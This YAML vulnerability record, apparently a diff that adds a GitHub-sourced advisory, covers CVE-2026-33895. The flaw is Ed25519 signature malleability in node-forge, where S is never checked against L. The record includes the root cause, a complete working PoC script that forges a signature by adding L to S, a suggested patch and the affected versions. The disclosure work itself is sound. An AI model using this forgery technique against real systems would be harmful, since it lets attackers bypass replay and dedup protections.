@@ -1,0 +1,274 @@
+advisory_id: GHSA-q67f-28xg-22rw
+datasource_id: github_osv/GHSA-q67f-28xg-22rw
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-q67f-28xg-22rw/GHSA-q67f-28xg-22rw.json
+aliases:
+  - CVE-2026-33895
+summary: "Forge has signature forgery in Ed25519 due to missing S > L check\n## Summary\nEd25519\
+  \ signature verification accepts forged non-canonical signatures where the scalar S is not\
+  \ reduced modulo the group order (`S >= L`). A valid signature and its `S + L` variant both\
+  \ verify in forge, while Node.js `crypto.verify` (OpenSSL-backed) rejects the `S + L` variant,\
+  \ [as defined by the specification](https://datatracker.ietf.org/doc/html/rfc8032#section-8.4).\
+  \ This class of signature malleability has been exploited in practice to bypass authentication\
+  \ and authorization logic (see [CVE-2026-25793](https://nvd.nist.gov/vuln/detail/CVE-2026-25793),\
+  \ [CVE-2022-35961](https://nvd.nist.gov/vuln/detail/CVE-2022-35961)). Applications relying\
+  \ on signature uniqueness (i.e., dedup by signature bytes, replay tracking, signed-object\
+  \ canonicalization checks) may be bypassed.\n\n## Impacted Deployments\n**Tested commit:**\
+  \ `8e1d527fe8ec2670499068db783172d4fb9012e5`\n**Affected versions:** tested on v1.3.3 (latest\
+  \ release) and all versions since Ed25519 was implemented.\n\n**Configuration assumptions:**\n\
+  - Default forge Ed25519 verify API path (`ed25519.verify(...)`).\n\n\n## Root Cause\nIn `lib/ed25519.js`,\
+  \ `crypto_sign_open(...)` uses the signature's last 32 bytes (`S`) directly in scalar multiplication:\n\
+  \n```javascript\nscalarbase(q, sm.subarray(32));\n```\n\nThere is no prior check enforcing\
+  \ `S < L` (Ed25519 group order). As a result, equivalent scalar classes can pass verification,\
+  \ including a modified signature where `S := S + L (mod 2^256)` when that value remains non-canonical.\
+  \ The PoC demonstrates this by mutating only the S half of a valid 64-byte signature.\n\n\
+  ## Reproduction Steps\n- Use Node.js (tested with `v24.9.0`) and clone `digitalbazaar/forge`\
+  \ at commit `8e1d527fe8ec2670499068db783172d4fb9012e5`.\n- Place and run the PoC script (`poc.js`)\
+  \ with `node poc.js` in the same level as the `forge` folder.\n- The script generates an Ed25519\
+  \ keypair via forge, signs a fixed message, mutates the signature by adding Ed25519 order\
+  \ L to S (bytes 32..63), and verifies both original and tweaked signatures with forge and\
+  \ Node/OpenSSL (`crypto.verify`).\n- Confirm output includes:\n\n```json\n{\n\t\"forge\":\
+  \ {\n\t\t\"original_valid\": true,\n\t\t\"tweaked_valid\": true\n\t},\n\t\"crypto\": {\n\t\
+  \t\"original_valid\": true,\n\t\t\"tweaked_valid\": false\n\t}\n}\n```\n\n## Proof of Concept\n\
+  \n**Overview:**\n- Demonstrates a valid control signature and a forged (S + L) signature in\
+  \ one run.\n- Uses Node/OpenSSL as a differential verification baseline.\n- Observed output\
+  \ on tested commit:\n\n```text\n{\n    \"forge\": {\n        \"original_valid\": true,\n \
+  \       \"tweaked_valid\": true\n    },\n    \"crypto\": {\n        \"original_valid\": true,\n\
+  \        \"tweaked_valid\": false\n    }\n}\n```\n\n<details><summary>poc.js</summary>\n\n\
+  ```javascript\n#!/usr/bin/env node\n'use strict';\n\nconst path = require('path');\nconst\
+  \ crypto = require('crypto');\nconst forge = require('./forge');\nconst ed = forge.ed25519;\n\
+  \nconst MESSAGE = Buffer.from('dderpym is the coolest man alive!');\n\n// Ed25519 group order\
+  \ L encoded as 32 bytes, little-endian (RFC 8032).\nconst ED25519_ORDER_L = Buffer.from([\n\
+  \  0xed, 0xd3, 0xf5, 0x5c, 0x1a, 0x63, 0x12, 0x58,\n  0xd6, 0x9c, 0xf7, 0xa2, 0xde, 0xf9,\
+  \ 0xde, 0x14,\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00,\
+  \ 0x00, 0x00, 0x00, 0x10,\n]);\n\n// For Ed25519 signatures, s is the last 32 bytes of the\
+  \ 64-byte signature.\n// This returns a new signature with s := s + L (mod 2^256), plus the\
+  \ carry.\nfunction addLToS(signature) {\n  if (!Buffer.isBuffer(signature) || signature.length\
+  \ !== 64) {\n    throw new Error('signature must be a 64-byte Buffer');\n  }\n  const out\
+  \ = Buffer.from(signature);\n  let carry = 0;\n  for (let i = 0; i < 32; i++) {\n    const\
+  \ idx = 32 + i; // s starts at byte 32 in the 64-byte signature.\n    const sum = out[idx]\
+  \ + ED25519_ORDER_L[i] + carry;\n    out[idx] = sum & 0xff;\n    carry = sum >> 8;\n  }\n\
+  \  return { sig: out, carry };\n}\n\nfunction toSpkiPem(publicKeyBytes) {\n  if (publicKeyBytes.length\
+  \ !== 32) {\n    throw new Error('publicKeyBytes must be 32 bytes');\n  }\n  // Builds an\
+  \ ASN.1 SubjectPublicKeyInfo for Ed25519 (RFC 8410) and returns PEM.\n  const oidEd25519 =\
+  \ Buffer.from([0x06, 0x03, 0x2b, 0x65, 0x70]);\n  const algId = Buffer.concat([Buffer.from([0x30,\
+  \ 0x05]), oidEd25519]);\n  const bitString = Buffer.concat([Buffer.from([0x03, 0x21, 0x00]),\
+  \ publicKeyBytes]);\n  const spki = Buffer.concat([Buffer.from([0x30, 0x2a]), algId, bitString]);\n\
+  \  const b64 = spki.toString('base64').match(/.{1,64}/g).join('\\n');\n  return `-----BEGIN\
+  \ PUBLIC KEY-----\\n${b64}\\n-----END PUBLIC KEY-----\\n`;\n}\n\nfunction verifyWithCrypto(publicKey,\
+  \ message, signature) {\n  try {\n    const keyObject = crypto.createPublicKey(toSpkiPem(publicKey));\n\
+  \    const ok = crypto.verify(null, message, keyObject, signature);\n    return { ok };\n\
+  \  } catch (error) {\n    return { ok: false, error: error.message };\n  }\n}\n\nfunction\
+  \ toResult(label, original, tweaked) {\n  return {\n    [label]: {\n      original_valid:\
+  \ original.ok,\n      tweaked_valid: tweaked.ok,\n    },\n  };\n}\n\nfunction main() {\n \
+  \ const kp = ed.generateKeyPair();\n  const sig = ed.sign({ message: MESSAGE, privateKey:\
+  \ kp.privateKey });\n  const ok = ed.verify({ message: MESSAGE, signature: sig, publicKey:\
+  \ kp.publicKey });\n  const tweaked = addLToS(sig);\n  const okTweaked = ed.verify({\n   \
+  \ message: MESSAGE,\n    signature: tweaked.sig,\n    publicKey: kp.publicKey,\n  });\n  const\
+  \ cryptoOriginal = verifyWithCrypto(kp.publicKey, MESSAGE, sig);\n  const cryptoTweaked =\
+  \ verifyWithCrypto(kp.publicKey, MESSAGE, tweaked.sig);\n  const result = {\n    ...toResult('forge',\
+  \ { ok }, { ok: okTweaked }),\n    ...toResult('crypto', cryptoOriginal, cryptoTweaked),\n\
+  \  };\n  console.log(JSON.stringify(result, null, 2));\n}\n\nmain();\n```\n</details>\n\n\
+  ## Suggested Patch\nAdd strict canonical scalar validation in Ed25519 verify path before scalar\
+  \ multiplication. (Parse S as little-endian 32-byte integer and reject if `S >= L`).\n\nHere\
+  \ is a patch we tested on our end to resolve the issue, though please verify it on your end:\n\
+  \n```diff\nindex f3e6faa..87eb709 100644\n--- a/lib/ed25519.js\n+++ b/lib/ed25519.js\n@@ -380,6\
+  \ +380,10 @@ function crypto_sign_open(m, sm, n, pk) {\n     return -1;\n   }\n\n+  if(!_isCanonicalSignatureScalar(sm,\
+  \ 32)) {\n+    return -1;\n+  }\n+\n   for(i = 0; i < n; ++i) {\n     m[i] = sm[i];\n   }\n\
+  @@ -409,6 +413,21 @@ function crypto_sign_open(m, sm, n, pk) {\n   return mlen;\n }\n\n+function\
+  \ _isCanonicalSignatureScalar(bytes, offset) {\n+  var i;\n+  // Compare little-endian scalar\
+  \ S against group order L and require S < L.\n+  for(i = 31; i >= 0; --i) {\n+    if(bytes[offset\
+  \ + i] < L[i]) {\n+      return true;\n+    }\n+    if(bytes[offset + i] > L[i]) {\n+    \
+  \  return false;\n+    }\n+  }\n+  // S == L is non-canonical.\n+  return false;\n+}\n+\n\
+  \ function modL(r, x) {\n   var carry, i, j, k;\n   for(i = 63; i >= 32; --i) {\n```\n\n##\
+  \ Resources\n\n- RFC 8032 (Ed25519): https://datatracker.ietf.org/doc/html/rfc8032#section-8.4\n\
+  \  - > Ed25519 and Ed448 signatures are not malleable due to the verification check that decoded\
+  \ S is smaller than l\n\n\n## Credit\n\nThis vulnerability was discovered as part of a U.C.\
+  \ Berkeley security research project by: Austin Chu, Sohee Kim, and Corban Villa."
+impacted_packages:
+  - purl: pkg:npm/node-forge
+    affected_versions: vers:npm/<1.4.0
+    fixed_versions: vers:npm/1.4.0
+    affected_packages:
+      - pkg:npm/node-forge@0.1.2
+      - pkg:npm/node-forge@0.1.3
+      - pkg:npm/node-forge@0.1.4
+      - pkg:npm/node-forge@0.1.5
+      - pkg:npm/node-forge@0.1.6
+      - pkg:npm/node-forge@0.1.7
+      - pkg:npm/node-forge@0.1.8
+      - pkg:npm/node-forge@0.1.9
+      - pkg:npm/node-forge@0.1.10
+      - pkg:npm/node-forge@0.1.11
+      - pkg:npm/node-forge@0.1.12
+      - pkg:npm/node-forge@0.1.13
+      - pkg:npm/node-forge@0.1.14
+      - pkg:npm/node-forge@0.1.15
+      - pkg:npm/node-forge@0.2.0
+      - pkg:npm/node-forge@0.2.1
+      - pkg:npm/node-forge@0.2.2
+      - pkg:npm/node-forge@0.2.3
+      - pkg:npm/node-forge@0.2.4
+      - pkg:npm/node-forge@0.2.5
+      - pkg:npm/node-forge@0.2.6
+      - pkg:npm/node-forge@0.2.7
+      - pkg:npm/node-forge@0.2.8
+      - pkg:npm/node-forge@0.2.9
+      - pkg:npm/node-forge@0.2.10
+      - pkg:npm/node-forge@0.2.11
+      - pkg:npm/node-forge@0.2.12
+      - pkg:npm/node-forge@0.2.13
+      - pkg:npm/node-forge@0.2.14
+      - pkg:npm/node-forge@0.2.15
+      - pkg:npm/node-forge@0.2.17
+      - pkg:npm/node-forge@0.2.18
+      - pkg:npm/node-forge@0.2.19
+      - pkg:npm/node-forge@0.2.20
+      - pkg:npm/node-forge@0.2.21
+      - pkg:npm/node-forge@0.2.22
+      - pkg:npm/node-forge@0.2.23
+      - pkg:npm/node-forge@0.2.24
+      - pkg:npm/node-forge@0.2.25
+      - pkg:npm/node-forge@0.2.26
+      - pkg:npm/node-forge@0.2.27
+      - pkg:npm/node-forge@0.2.28
+      - pkg:npm/node-forge@0.2.29
+      - pkg:npm/node-forge@0.2.30
+      - pkg:npm/node-forge@0.2.31
+      - pkg:npm/node-forge@0.2.32
+      - pkg:npm/node-forge@0.2.33
+      - pkg:npm/node-forge@0.2.34
+      - pkg:npm/node-forge@0.2.35
+      - pkg:npm/node-forge@0.2.36
+      - pkg:npm/node-forge@0.2.37
+      - pkg:npm/node-forge@0.3.0
+      - pkg:npm/node-forge@0.4.1-dev
+      - pkg:npm/node-forge@0.4.1
+      - pkg:npm/node-forge@0.4.2
+      - pkg:npm/node-forge@0.4.3
+      - pkg:npm/node-forge@0.5.1
+      - pkg:npm/node-forge@0.5.2
+      - pkg:npm/node-forge@0.5.3
+      - pkg:npm/node-forge@0.5.4
+      - pkg:npm/node-forge@0.5.5
+      - pkg:npm/node-forge@0.6.0
+      - pkg:npm/node-forge@0.6.1
+      - pkg:npm/node-forge@0.6.2
+      - pkg:npm/node-forge@0.6.3
+      - pkg:npm/node-forge@0.6.4
+      - pkg:npm/node-forge@0.6.5
+      - pkg:npm/node-forge@0.6.6
+      - pkg:npm/node-forge@0.6.7
+      - pkg:npm/node-forge@0.6.8
+      - pkg:npm/node-forge@0.6.9
+      - pkg:npm/node-forge@0.6.10
+      - pkg:npm/node-forge@0.6.11
+      - pkg:npm/node-forge@0.6.12
+      - pkg:npm/node-forge@0.6.13
+      - pkg:npm/node-forge@0.6.14
+      - pkg:npm/node-forge@0.6.16
+      - pkg:npm/node-forge@0.6.18
+      - pkg:npm/node-forge@0.6.19
+      - pkg:npm/node-forge@0.6.20
+      - pkg:npm/node-forge@0.6.21
+      - pkg:npm/node-forge@0.6.22
+      - pkg:npm/node-forge@0.6.23
+      - pkg:npm/node-forge@0.6.24
+      - pkg:npm/node-forge@0.6.25
+      - pkg:npm/node-forge@0.6.26
+      - pkg:npm/node-forge@0.6.27
+      - pkg:npm/node-forge@0.6.28
+      - pkg:npm/node-forge@0.6.29
+      - pkg:npm/node-forge@0.6.30
+      - pkg:npm/node-forge@0.6.31
+      - pkg:npm/node-forge@0.6.32
+      - pkg:npm/node-forge@0.6.33
+      - pkg:npm/node-forge@0.6.34
+      - pkg:npm/node-forge@0.6.35
+      - pkg:npm/node-forge@0.6.37
+      - pkg:npm/node-forge@0.6.38
+      - pkg:npm/node-forge@0.6.39
+      - pkg:npm/node-forge@0.6.40
+      - pkg:npm/node-forge@0.6.41
+      - pkg:npm/node-forge@0.6.42
+      - pkg:npm/node-forge@0.6.43
+      - pkg:npm/node-forge@0.6.44
+      - pkg:npm/node-forge@0.6.45
+      - pkg:npm/node-forge@0.6.46
+      - pkg:npm/node-forge@0.6.47
+      - pkg:npm/node-forge@0.6.48
+      - pkg:npm/node-forge@0.6.49
+      - pkg:npm/node-forge@0.7.0
+      - pkg:npm/node-forge@0.7.1
+      - pkg:npm/node-forge@0.7.2
+      - pkg:npm/node-forge@0.7.3
+      - pkg:npm/node-forge@0.7.4
+      - pkg:npm/node-forge@0.7.5
+      - pkg:npm/node-forge@0.7.6
+      - pkg:npm/node-forge@0.8.0
+      - pkg:npm/node-forge@0.8.1
+      - pkg:npm/node-forge@0.8.2
+      - pkg:npm/node-forge@0.8.3
+      - pkg:npm/node-forge@0.8.4
+      - pkg:npm/node-forge@0.8.5
+      - pkg:npm/node-forge@0.9.0
+      - pkg:npm/node-forge@0.9.1
+      - pkg:npm/node-forge@0.9.2
+      - pkg:npm/node-forge@0.10.0
+      - pkg:npm/node-forge@1.0.0
+      - pkg:npm/node-forge@1.1.0
+      - pkg:npm/node-forge@1.2.0
+      - pkg:npm/node-forge@1.2.1
+      - pkg:npm/node-forge@1.3.0
+      - pkg:npm/node-forge@1.3.1
+      - pkg:npm/node-forge@1.3.2
+      - pkg:npm/node-forge@1.3.3
+    fixed_packages:
+      - pkg:npm/node-forge@1.4.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/digitalbazaar/forge
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/digitalbazaar/forge
+        commit: bdecf11571c9f1a487cc0fe72fe78ff6dfa96b85
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-q67f-28xg-22rw/GHSA-q67f-28xg-22rw.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-347
+references:
+  - url: https://datatracker.ietf.org/doc/html/rfc8032#section-8.4
+    reference_type:
+    reference_id:
+  - url: https://github.com/digitalbazaar/forge
+    reference_type:
+    reference_id:
+  - url: https://github.com/digitalbazaar/forge/commit/bdecf11571c9f1a487cc0fe72fe78ff6dfa96b85
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2022-35961
+    reference_type:
+    reference_id: CVE-2022-35961
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-25793
+    reference_type:
+    reference_id: CVE-2026-25793
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-33895
+    reference_type:
+    reference_id: CVE-2026-33895
+  - url: https://github.com/digitalbazaar/forge/security/advisories/GHSA-q67f-28xg-22rw
+    reference_type:
+    reference_id: GHSA-q67f-28xg-22rw
+exploits: []
